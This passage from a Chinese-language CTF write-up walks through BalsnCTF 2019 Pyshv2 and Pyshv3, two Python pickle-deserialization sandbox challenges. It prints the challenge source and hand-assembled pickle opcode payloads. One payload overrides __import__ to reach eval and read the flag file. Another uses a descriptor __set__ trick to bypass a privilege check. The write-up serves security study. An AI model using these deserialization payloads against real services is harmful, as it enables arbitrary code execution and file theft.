    pickle.whitelist.append('structs')
    class Pysh(object):
        def __init__(self):
            self.login()
            self.cmds = {
                'help': self.cmd_help,
                'flag': self.cmd_flag,
            }
        def login(self):
            user = input().encode('ascii')
            user = codecs.decode(user, 'base64')
            user = pickle.loads(user)
            raise NotImplementedError("Not Implemented QAQ")
        def run(self):
            while True:
                req = input('$ ')
                func = self.cmds.get(req, None)
                if func is None:
                    print('pysh: ' + req + ': command not found')
                else:
                    func()
        def cmd_help(self):
            print('Available commands: ' + ' '.join(self.cmds.keys()))
        def cmd_su(self):
            print("Not Implemented QAQ")
            # self.user.privileged = 1
        def cmd_flag(self):
            print("Not Implemented QAQ")
    if __name__ == '__main__':
        pysh = Pysh()
        pysh.run()
    # File: structs.py 为空
真会玩，给你一个空模块：），先看下空模块有哪些内置方法：
    >>> structs = __import__('structs')
    >>> structs
    >>> dir(structs)
    ['__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__']
    >>> getattr(structs, '__builtins__')['eval']
好了，问题又转变为如何获取键值，还是比较艰难。
查文档时又发现了一个东西，原来 __import__ 可被覆盖。
> __import__(name, globals=None, locals=None, fromlist=(), level=0)
>
> 此函数会由 [import](https://docs.python.org/zh-> cn/3/reference/simple_stmts.html#import) 语句发起调用。 它可以被替换 (通过导入
> [builtins](https://docs.python.org/zh-cn/3/library/builtins.html#module-> builtins) 模块并赋值给 builtins.__import__) 以便修改 import 语句的语义，但是 强烈
> 不建议这样做，因为使用导入钩子 (参见 [PEP 302](https://www.python.org/dev/peps/pep-0302))
> 通常更容易实现同样的目标，并且不会导致代码问题，因为许多代码都会假定所用的是默认实现。 同样也不建议直接使用
> [__import__()](https://docs.python.org/zh-> cn/3/library/functions.html#__import__) 而应该用
> [importlib.import_module()](https://docs.python.org/zh-> cn/3/library/importlib.html#importlib.import_module)。
那该覆盖成什么函数呢？最好是 __import__(module) 后能返回字典的函数。
只能从内置函数下手了，一个一个试吧，发现没一个能用的。
后来又想起还有一堆魔术方法没有试，又是一篇广阔的天地。
这个 __getattribute__ 恰好能符合我们的要求，真棒。
    >>> getattr(structs, '__getattribute__')('__builtins__')
    {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': , '__spec__': ModuleSpec(name='builtins', loader=),...
再理下思路：（伪代码）
    d = getattr(structs, '__builtins__')  	 # 获取到字典，先存起来
    getattr(structs, '__import__') = getattr(structs, '__getattribute__')  # 覆盖 __import__
    setattr(structs, 'structs', d)  		 # 创建个 structs 的属性，字典写入该属性
    mo = __import__(structs)				 # 此时的 mo 就是我们之前的 __builtins__
    getattr(mo, 'get')  			 	 	 # 获取到 get 方法，然后就可以按照 pyshv1 的思路来了
转换为 pickle：
    cstructs
    __getattribute__
    p100
    0cstructs
    __dict__
    S'structs'
    cstructs
    __builtins__						# 先添加 structs 属性
    p101
    sg101
    S'__import__'
    g100
    scstructs
    get
    (S'eval'
    tR(S'print(open("../flag").read())'   # 这里已经不能 __import__('os') 了，能继续执行命令吗：）
    tR.
### BalsnCTF 2019 Pyshv3
> 环境：
> 
    # File: securePickle.py
    import pickle
    import io
    whitelist = []
    # See https://docs.python.org/3.7/library/pickle.html#restricting-globals
    class RestrictedUnpickler(pickle.Unpickler):
        def find_class(self, module, name):
            if module not in whitelist or '.' in name:
                raise KeyError('The pickle is spoilt :(')
            return pickle.Unpickler.find_class(self, module, name)
    def loads(s):
        """Helper function analogous to pickle.loads()."""
        return RestrictedUnpickler(io.BytesIO(s)).load()
    dumps = pickle.dumps
    # File: server.py
    import securePickle as pickle
    import codecs
    import os
    pickle.whitelist.append('structs')
    class Pysh(object):
        def __init__(self):
            self.key = os.urandom(100)
            self.login()
            self.cmds = {
                'help': self.cmd_help,
                'whoami': self.cmd_whoami,
                'su': self.cmd_su,
                'flag': self.cmd_flag,
            }
        def login(self):
            with open('../flag.txt', 'rb') as f:
                flag = f.read()
            flag = bytes(a ^ b for a, b in zip(self.key, flag))
            user = input().encode('ascii')
            user = codecs.decode(user, 'base64')
            user = pickle.loads(user)
            print('Login as ' + user.name + ' - ' + user.group)
            user.privileged = False
            user.flag = flag
            self.user = user
        def run(self):
            while True:
                req = input('$ ')
                func = self.cmds.get(req, None)
                if func is None:
                    print('pysh: ' + req + ': command not found')
                else:
                    func()
        def cmd_help(self):
            print('Available commands: ' + ' '.join(self.cmds.keys()))
        def cmd_whoami(self):
            print(self.user.name, self.user.group)
        def cmd_su(self):
            print("Not Implemented QAQ")
            # self.user.privileged = 1
        def cmd_flag(self):
            if not self.user.privileged:
                print('flag: Permission denied')
            else:
                print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))
    if __name__ == '__main__':
        pysh = Pysh()
        pysh.run()
    # File: structs.py
    class User(object):
        def __init__(self, name, group):
            self.name = name
            self.group = group
            self.isadmin = 0
            self.prompt = ''
RestrictedUnpickler 模块和 Pyshv1 是一样的，之前只有名字的函数在这里基本都实现了。
注意到，在 cmd_flag() 中，self.user.privileged 只要就符合条件将输出 flag。
    user = pickle.loads(user)
    user.privileged = False  # 这个有点猛，后面还有赋值，没法直接覆盖了
魔术方法列表中可以看到，给属性赋值时，用的是 __setattr__(self, name)，能不能把这个干掉？
看来不太行，把这个干了，flag 自然也赋值不上了。能不能保留 privileged ，同时又不干扰 flag？
继续在魔术方法里寻找，突然看到了一个创建描述符对象里有 __set__ 方法，会不会有点关系呢。
> 属性访问的默认行为是从一个对象的字典中获取、设置或删除属性。例如，a.x 的查找顺序会从 a.__dict__[‘x’] 开始，然后是
> type(a).__dict__[‘x’]，接下来依次查找 type(a) 的基类，不包括元类 如果找到的值是定义了某个描述器方法的对象，则
> Python 可能会重载默认行为并转而发起调用描述器方法。这具体发生在优先级链的哪个环节则要根据所定义的描述器方法及其被调用的方式来决定。
关于描述符的讲解还可以看下这文章：
    class RevealAccess(object):
        """A data descriptor that sets and returns values
           normally and prints a message logging their access.
        """
        def __init__(self, initval=None, name='var'):
            self.val = initval
            self.name = name
        def __get__(self, obj, objtype):
            print('Retrieving', self.name)
            return self.val
        def __set__(self, obj, val):
            print('Updating', self.name)
            self.val = val
    >>> class MyClass(object):
    ...     x = RevealAccess(10, 'var "x"')
    ...     y = 5
    ...
    >>> m = MyClass()
    >>> m.x
    Retrieving var "x"
    10
    >>> m.x = 20
    Updating var "x"
    >>> m.x
    Retrieving var "x"
    20
    >>> m.y
    5
可清楚的看到，对属性 x 的操作都被 “hook” 住了，而 y 没有受影响。这就有个小问题，反序列化时没有额外的自定义类引入了，比如这里的
RevealAccess，怎么给指定属性进行代理呢？那就把自己作为一个描述符：）。
    class MyClass(object):
        def __set__(self, obj, val):
            pass
        y = 5
    m = MyClass()
    MyClass.x = m
    print(m.x)
    m.y = 6
    print(m.y)
    m.x = 3
    print(m.x)
    '''
    6
    '''
把这个过程转为 pickle：
    cstructs
    User
    p100
    (I111
    I222
    tRp101
    g100
    (N}S'__set__'
    g100
    sS'privileged'
    g101
    stbg101
    .
看一下结果：
## 参考链接
[https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python
反序列化漏洞/](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)